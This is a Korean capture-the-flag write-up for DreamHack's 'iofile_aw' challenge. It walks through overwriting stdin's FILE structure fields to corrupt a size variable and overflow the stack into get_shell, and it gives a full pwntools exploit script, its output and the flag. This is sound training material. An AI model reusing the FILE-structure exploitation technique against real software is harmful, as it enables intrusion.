# [DreamHack] iofile_aw

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com) 

> 이 문제는 서버에서 작동하고 있는 서비스(iofile_aw)의 바이너리와 소스 코드가 주어집니다.
> 프로그램의 취약점을 찾고 익스플로잇해 get_shell 함수를 실행시키세요.
> 셸을 획득한 후, “flag” 파일을 읽어 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
> 플래그의 형식은 DH{…} 입니다.
>
> Release: [iofile_aw.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8550679/iofile_aw.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/102066383/162560321-8e54657c-e8e2-4e77-af09-31f973b7c0b9.png)

## Analysis

`read`, `help`, `printf`, `exit` 4개의 커맨드를 사용할 수 있다.

### read

```c
		if(!strcmp(command, "read")) {
			read_str();
		}
```

```c
char buf[80];

void read_str() {
	fgets(buf, sizeof(buf)-1, stdin);
}
```

전역 변수 `buf`에 79바이트만큼 입력을 받는다.

### help

```c
		else if(!strcmp(command, "help")) {
			help();
		}
```

```c
void help() {
	printf("read: Read a line from the standard input and split it into fields.\n");
}
```

별 거 없다.

### printf

```c
		else if(!strncmp(command, "printf", 6)) {
			if ( strtok(command, " ") ) {
				src = (long *)strtok(NULL, " ");
				dst = (long *)stdin;
				if(src) 
					memcpy(dst, src, 0x40);
			}				
		}
```

`printf <string>`의 형식으로 커맨드를 입력하면 `stdin`에 `<string>`을 복사한다. `stdin`을 최대 `0x40`바이트만큼 덮어쓸 수 있다. 따라서 `_flags`, `_IO_read_ptr`, `_IO_read_end`, `_IO_read_base`, `_IO_write_base`, `_IO_write_ptr`, `_IO_write_end`, `_IO_buf_base` 8개의 필드를 원하는 값으로 조작할 수 있다.

## Exploit

`_IO_buf_base`를 전역 변수 `size`의 주소로 조작하면 `size`를 원하는 값으로 덮을 수 있다. 충분히 큰 값으로 덮으면 `read_command()`에서 BOF가 발생하여 `main()`의 return address를 덮을 수 있다. `get_shell()`의 주소로 덮으면 셸을 획득할 수 있다.

```python
from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/iofile_aw')
else:
    r = remote('host1.dreamhack.games', 16842)

sl = r.sendline
sa = r.sendafter

get_shell = 0x4009fa  # get_shell()
buf = 0x602040  # global var <buf>
size = 0x602010  # global var <size>


# overwrite size with 0x1000

payload = p64(0xfbad208b)  # flag
payload += p64(0)  # _IO_read_ptr
payload += p64(0)  # _IO_read_end
payload += p64(0)  # _IO_read_base
payload += p64(0)  # _IO_write_base
payload += p64(0)  # _IO_write_ptr
payload += p64(0)  # _IO_write_end
payload += p64(size)  # _IO_buf_base

r.sendafter('# ', b'printf ' + payload)

r.sendafter('# ', 'read\x00')
r.sendline(p64(0x1000))


# overwrite return address of main() with get_shell()

r.sendafter('# ', b'exit\x00'.ljust(0x228, b'a') + p64(get_shell))


r.interactive()
```

```
$ python3 solve.py
[+] Opening connection to host1.dreamhack.games on port 16842: Done
[*] Switching to interactive mode
$ cat flag
DH{ca23dc42d38746251b3c483158c4a271}
```